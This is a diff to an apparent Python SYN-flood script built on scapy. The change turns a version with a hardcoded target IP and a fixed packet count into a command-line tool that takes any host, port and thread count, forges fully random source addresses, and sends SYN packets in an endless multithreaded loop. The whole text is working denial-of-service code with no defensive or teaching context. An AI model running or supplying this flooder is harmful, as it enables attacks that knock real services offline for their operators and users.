@@ -7,13 +7,12 @@ import sys, getopt
 from scapy.all import *
 from concurrent.futures import ThreadPoolExecutor
 
-dosip = "117.113.42.10"
-dport = 8080
-
-def SendPkt(dosip,dport):
-	ip3 = random.randint(1,253)
-	ip4 = random.randint(1,253)
-	randip = "58.132.%s.%s"%(ip3,ip4)
+def SendSYN(dosip,dport):
+	ip1 = random.randint(1,255)
+	ip2 = random.randint(1,255)
+	ip3 = random.randint(1,255)
+	ip4 = random.randint(1,255)
+	randip = "%d.%d.%d.%d"%(ip1,ip2,ip3,ip4)
 	sport = random.randint(10000,65535)
 	try:
 		synpkt = IP(src=randip,dst=dosip)/TCP(sport=sport,dport=dport,flags="S")
@@ -21,26 +20,36 @@ def SendPkt(dosip,dport):
 		time.sleep(1)
 	except Exception, e:
 		return e
-		
+
+def usage():
+	print("Usage:%s [-h <host> -p <port> -r <thread>][--help]]"%(sys.argv[0]))
+
 def main(argv):
+	dosip = ''
+	dport = ''
 	Thread = ''
-	Number = ''
-	try:
-		opts, args = getopt.getopt(argv,"hr:n:")
-	except getopt.GetoptError:
-		print 'synflood.py -r <thread> -n <number>'
-		sys.exit(2)
-	for opt, arg in opts:
-		if opt == '-h':
-			print 'synflood.py -r <thread> -n <number>'
-			sys.exit()
-		elif opt in ("-r"):
-			Thread = arg
-		elif opt in ("-n"):
-			Number = arg
-	with ThreadPoolExecutor(int(Thread)) as executor:
-		for i in range(0,int(Number)):
-			executor.submit(SendPkt,dosip,dport)
-    
+	if not sys.argv[1:]:
+		usage()
+		sys.exit(1)
+	else:
+		try:
+			opts, args = getopt.getopt(argv[1:],"r:h:p:",["--help"])
+			for opt, arg in opts:
+				if opt == '--help':
+					usage()
+					sys.exit(1)
+				elif opt in ('-r'):
+					Thread = int(arg)
+				elif opt in ('-h'):	
+					dosip = arg
+				elif opt in ('-p'):
+					dport = int(arg)
+		except getopt.GetoptError:
+			usage()
+			sys.exit(1)
+		with ThreadPoolExecutor(Thread) as executor:
+			while True:
+				executor.submit(SendSYN,dosip,dport)
+   
 if __name__ == '__main__':
-	main(sys.argv[1:])
+	main(sys.argv)
